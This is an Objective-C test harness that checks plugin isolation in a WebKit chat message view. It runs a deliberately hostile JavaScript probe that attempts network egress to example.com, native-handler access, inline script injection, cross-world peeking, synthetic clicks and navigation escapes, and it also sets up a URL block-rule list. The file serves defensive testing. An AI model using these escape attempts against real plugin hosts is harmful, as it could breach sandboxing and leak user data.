/* Isolation probe: mirrors the message view's real hardening (remote-load block
 * rule list, file access unlock, file:// origin, per-plugin content world, and the
 * native handler living only in the bridge world with the shared gesture bridge
 * script) and runs a hostile plugin that tries every escape.
 *
 * Vectors that must come back BLOCKED: network egress in every form (fetch, XHR,
 * WebSocket, image, sendBeacon, remote script), the native handler from the plugin
 * world, the native handler from the page world (including via an injected inline
 * script element, which runs there), a navigation away from the file origin, a
 * peek into another world's globals, and a synthetic click on a transfer button
 * (the gesture bridge only forwards trusted events).
 *
 * Two controls keep the measurement honest: a local file image must LOAD (so a
 * blocked-everything environment cannot fake a pass), and the bridge world's own
 * "ready" message must ARRIVE (so an unplugged handler cannot fake one either).
 */
#import <Cocoa/Cocoa.h>
#import <WebKit/WebKit.h>

#import "../../WebKit Message View/AIWKGestureBridge.h"
#import "../AIJSXtrasPreamble.h"

static NSString *PROBE =
@"(async function(){\n"
@"  var results = [];\n"
@"  function record(name, blocked){ results.push((blocked?'BLOCKED ':'LEAKED  ')+name); }\n"
@"  // 1. fetch to https\n"
@"  try { await fetch('https://example.com/x'); record('fetch-https', false); } catch(e){ record('fetch-https', true); }\n"
@"  // 2. XHR to https\n"
@"  try { await new Promise(function(res,rej){var x=new XMLHttpRequest();x.open('GET','https://example.com/x');x.onload=function(){res();};x.onerror=function(){rej();};x.send();}); record('xhr-https', false);} catch(e){ record('xhr-https', true); }\n"
@"  // 3. WebSocket\n"
@"  try { var ws=new WebSocket('wss://example.com/x'); await new Promise(function(res,rej){ws.onopen=function(){res();};ws.onerror=function(){rej();};setTimeout(rej,800);}); record('websocket', false);} catch(e){ record('websocket', true); }\n"
@"  // 4. remote image load\n"
@"  try { await new Promise(function(res,rej){var im=new Image();im.onload=function(){res();};im.onerror=function(){rej();};im.src='https://example.com/x.gif';setTimeout(rej,800);}); record('image-https', false);} catch(e){ record('image-https', true); }\n"
@"  // 5. sendBeacon\n"
@"  try { var ok = navigator.sendBeacon ? navigator.sendBeacon('https://example.com/b','x') : false; record('sendbeacon', !ok);} catch(e){ record('sendbeacon', true); }\n"
@"  // 6. native adium handler must be undefined in this world\n"
@"  var noHandler = !(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.adium);\n"
@"  record('native-adium-handler', noHandler);\n"
@"  // 7. injected remote script element\n"
@"  try { await new Promise(function(res,rej){var sc=document.createElement('script');sc.onload=function(){res();};sc.onerror=function(){rej();};sc.src='https://example.com/x.js';document.head.appendChild(sc);setTimeout(rej,800);}); record('remote-script', false);} catch(e){ record('remote-script', true); }\n"
@"  // 8. control: a LOCAL file image must load, or this harness could not tell\n"
@"  //    blocked from broken. Reported inverted so a failure prints as LEAKED.\n"
@"  try { await new Promise(function(res,rej){var im=new Image();im.onload=function(){res();};im.onerror=function(){rej();};im.src='pixel.gif';setTimeout(rej,1500);}); record('control-file-image-loads', true);} catch(e){ record('control-file-image-loads', false); }\n"
@"  // 9. injected INLINE script: it executes in the page world, which must hold no\n"
@"  //    handler either; the script reports what it found through the shared DOM\n"
@"  await new Promise(function(res){\n"
@"    var sc=document.createElement('script');\n"
@"    sc.textContent=\"document.documentElement.setAttribute('data-probe-pageworld', (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.adium) ? 'handler' : 'nothing');\";\n"
@"    document.head.appendChild(sc); setTimeout(res, 200);\n"
@"  });\n"
@"  record('pageworld-handler-via-dom-script', document.documentElement.getAttribute('data-probe-pageworld') !== 'handler');\n"
@"  // 10. leave a marker for the cross-world check; another world must not see it\n"
@"  window.__probeWorldMarker = 'A';\n"
@"  // 10b. by the time a plugin runs, the temporary settings global must be gone and what is left frozen\n"
@"  record('settings-global-deleted', typeof window.__adiumXtraSettings === 'undefined');\n"
@"  var frozen = false;\n"
@"  try { adiumPlugin.settings.probe = 'tampered'; } catch(e) {}\n"
@"  try { frozen = Object.isFrozen(adiumPlugin.settings) && adiumPlugin.settings.probe === 'value'; } catch(e) {}\n"
@"  record('settings-frozen', frozen);\n"
@"  // 11. synthetic click on a transfer button; the gesture bridge must ignore it\n"
@"  var btn=document.getElementById('probe-transfer'); if (btn) btn.click();\n"
@"  // publish results into the shared DOM for the native side to read\n"
@"  var out = document.createElement('div'); out.id='probe-results'; out.textContent = results.join('\\n'); document.body.appendChild(out);\n"
@"  // 12. last, after publishing: try to navigate away; the policy must refuse\n"
@"  try { window.location.href='https://example.com/'; } catch(e) {}\n"
@"})();";

@interface Probe : NSObject <WKNavigationDelegate>
@property (nonatomic) int fails;
@property (nonatomic) int readyCount;
@property (nonatomic) BOOL sawNavigationAttempt;
@end

@implementation Probe {
	WKWebView *_web;
	NSURL *_pageURL;
}

- (void)start
{
	NSString *rules = @"[{\"trigger\":{\"url-filter\":\"^https?://\"},\"action\":{\"type\":\"block\"}},"
					   "{\"trigger\":{\"url-filter\":\"^wss?://\"},\"action\":{\"type\":\"block\"}}]";
	[[WKContentRuleListStore defaultStore] compileContentRuleListForIdentifier:@"ProbeBlock"
													   encodedContentRuleList:rules
															completionHandler:^(WKContentRuleList *list, NSError *error) {
		if (!list) { printf("FAIL: rule list did not compile: %s\n", [error description].UTF8String ?: ""); exit(1); }

		WKWebViewConfiguration *cfg = [[WKWebViewConfiguration alloc] init];
		WKUserContentController *ucc = [[WKUserContentController alloc] init];
		[ucc addContentRuleList:list];

		/* The native handler and the gesture bridge, exactly as the app installs them:
		 * both only in the bridge world. */
		WKContentWorld *bridgeWorld = [WKContentWorld worldWithName:AIWKBridgeWorldName];
		[ucc addScriptMessageHandler:(id)self contentWorld:bridgeWorld name:@"adium"];
		[ucc addUserScript:[[WKUserScript alloc] initWithSource:AIWKGestureBridgeScript
												  injectionTime:WKUserScriptInjectionTimeAtDocumentEnd
											   forMainFrameOnly:YES
												 inContentWorld:bridgeWorld]];

		// The probe in its own content world, as the manager injects a plugin
		WKContentWorld *world = [WKContentWorld worldWithName:@"adium.jsxtra.probe"];

		/* The settings blob and the preamble ahead of it, in the manager's own order, so the probe
		 * can measure what the trusted host does with a value before any plugin sees it. */
		[ucc addUserScript:[[WKUserScript alloc] initWithSource:AIJSXtrasSettingsScript(@{ @"probe": @"value" })
												 injectionTime:WKUserScriptInjectionTimeAtDocumentEnd
											  forMainFrameOnly:YES
												inContentWorld:world]];
		[ucc addUserScript:[[WKUserScript alloc] initWithSource:AIJSXtrasPreamble
												 injectionTime:WKUserScriptInjectionTimeAtDocumentEnd
											  forMainFrameOnly:YES
												inContentWorld:world]];

		[ucc addUserScript:[[WKUserScript alloc] initWithSource:PROBE
												 injectionTime:WKUserScriptInjectionTimeAtDocumentEnd
											  forMainFrameOnly:YES
												inContentWorld:world]];
		cfg.userContentController = ucc;
		@try { [cfg.preferences setValue:@YES forKey:@"allowFileAccessFromFileURLs"]; } @catch (id e) {}

		_web = [[WKWebView alloc] initWithFrame:NSMakeRect(0,0,300,300) configuration:cfg];
		_web.navigationDelegate = self;

		NSString *dir = [NSTemporaryDirectory() stringByAppendingPathComponent:[[NSUUID UUID] UUIDString]];
		[[NSFileManager defaultManager] createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:NULL];

		/* A 1x1 GIF for the local-load control (vector 8). */
		static const unsigned char gif[] = {
			0x47,0x49,0x46,0x38,0x39,0x61,0x01,0x00,0x01,0x00,0x80,0x00,0x00,
			0x00,0x00,0x00,0xff,0xff,0xff,0x21,0xf9,0x04,0x01,0x00,0x00,0x00,
			0x00,0x2c,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x02,0x02,
			0x44,0x01,0x00,0x3b };
		[[NSData dataWithBytes:gif length:sizeof(gif)]
			writeToFile:[dir stringByAppendingPathComponent:@"pixel.gif"] atomically:YES];

		/* A transfer button wired the way the styles wire theirs, for the
		 * synthetic-click vector (11). */
		NSString *page = [dir stringByAppendingPathComponent:@"p.html"];
		[@"<html><body>"
		 @"<input type=\"button\" id=\"probe-transfer\" value=\"Accept\" "
		 @"onclick=\"client.handleFileTransfer('Save', 'probe-id')\">"
		 @"</body></html>" writeToFile:page atomically:YES encoding:NSUTF8StringEncoding error:NULL];
		_pageURL = [NSURL fileURLWithPath:page];
		[_web loadFileURL:_pageURL allowingReadAccessToURL:[NSURL fileURLWithPath:@"/" isDirectory:YES]];
	}];
}

/* The app's navigation policy in miniature: file and about may pass, everything
 * else is refused. The probe's vector 12 must land here and be denied. */
- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction
									 decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler
{
	NSString *scheme = navigationAction.request.URL.scheme.lowercaseString;
	if ([scheme isEqualToString:@"file"] || [scheme isEqualToString:@"about"]) {
		decisionHandler(WKNavigationActionPolicyAllow);
	} else {
		self.sawNavigationAttempt = YES;
		decisionHandler(WKNavigationActionPolicyCancel);
	}
}

/* Only the bridge world can reach this at all. Its own "ready" is expected once and
 * doubles as the control that the handler plumbing works; anything else means a
 * scripted actor drove the bridge, and that is a leak. */
- (void)userContentController:(WKUserContentController *)ucc didReceiveScriptMessage:(WKScriptMessage *)message
{
	NSString *type = [message.body isKindOfClass:[NSDictionary class]] ? [message.body objectForKey:@"type"] : nil;
	if ([type isEqualToString:@"ready"]) {
		self.readyCount++;
		return;
	}
	printf("LEAKED  native-message %s\n", [[message.body description] UTF8String] ?: "(?)");
	self.fails++;
}

- (void)webView:(WKWebView *)wv didFinishNavigation:(WKNavigation *)nav
{
	dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4.0*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
		[wv evaluateJavaScript:@"(document.getElementById('probe-results')||{}).textContent||'no results'"
			 completionHandler:^(id r, NSError *e) {
			NSString *out = [r isKindOfClass:[NSString class]] ? r : @"(none)";
			printf("%s\n", out.UTF8String);
			for (NSString *line in [out componentsSeparatedByString:@"\n"]) {
				if ([line hasPrefix:@"LEAKED"]) self.fails++;
			}
			if ([out isEqualToString:@"no results"]) self.fails++;

			// Page world: no handler, and no sight of the plugin world's marker
			[wv evaluateJavaScript:@"[(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.adium) ? 'handler' : 'nothing', typeof window.__probeWorldMarker, typeof window.__adiumXtraSettings].join('|')"
				 completionHandler:^(id pw, NSError *e2) {
				NSString *pageWorld = [pw isKindOfClass:[NSString class]] ? pw : @"";
				BOOL pageClean = [pageWorld isEqualToString:@"nothing|undefined|undefined"];
				printf("%s pageworld-clean (%s)\n", pageClean ? "BLOCKED" : "LEAKED ", pageWorld.UTF8String);
				if (!pageClean) self.fails++;

				// A second plugin world: the first world's marker must be invisible
				WKContentWorld *worldB = [WKContentWorld worldWithName:@"adium.jsxtra.probe-b"];
				[wv evaluateJavaScript:@"[typeof window.__probeWorldMarker, typeof window.__adiumXtraSettings].join('|')"
							   inFrame:nil
						inContentWorld:worldB
					 completionHandler:^(id wb, NSError *e3) {
					BOOL isolated = [wb isKindOfClass:[NSString class]] && [wb isEqualToString:@"undefined|undefined"];
					printf("%s cross-world-globals\n", isolated ? "BLOCKED" : "LEAKED ");
					if (!isolated) self.fails++;

					// Still on the file origin, and the escape attempt was made and refused
					BOOL onFile = [wv.URL.scheme isEqualToString:@"file"];
					printf("%s navigation-egress (attempted=%s, still-file=%s)\n",
						   (onFile && self.sawNavigationAttempt) ? "BLOCKED" : "LEAKED ",
						   self.sawNavigationAttempt ? "yes" : "no", onFile ? "yes" : "no");
					if (!onFile || !self.sawNavigationAttempt) self.fails++;

					// Control: the bridge's own ready arrived exactly once
					printf("%s control-bridge-ready (%d)\n", self.readyCount == 1 ? "BLOCKED" : "LEAKED ", self.readyCount);
					if (self.readyCount != 1) self.fails++;

					printf(self.fails ? "== %d LEAK(S)\n" : "== all vectors blocked, controls green\n", self.fails);
					exit(self.fails ? 1 : 0);
				}];
			}];
		}];
	});
}
@end

int main(void)
{
	@autoreleasepool {
		[NSApplication sharedApplication];
		Probe *p = [[Probe alloc] init];
		[p start];
		[[NSRunLoop currentRunLoop] run];
	}
	return 0;
}
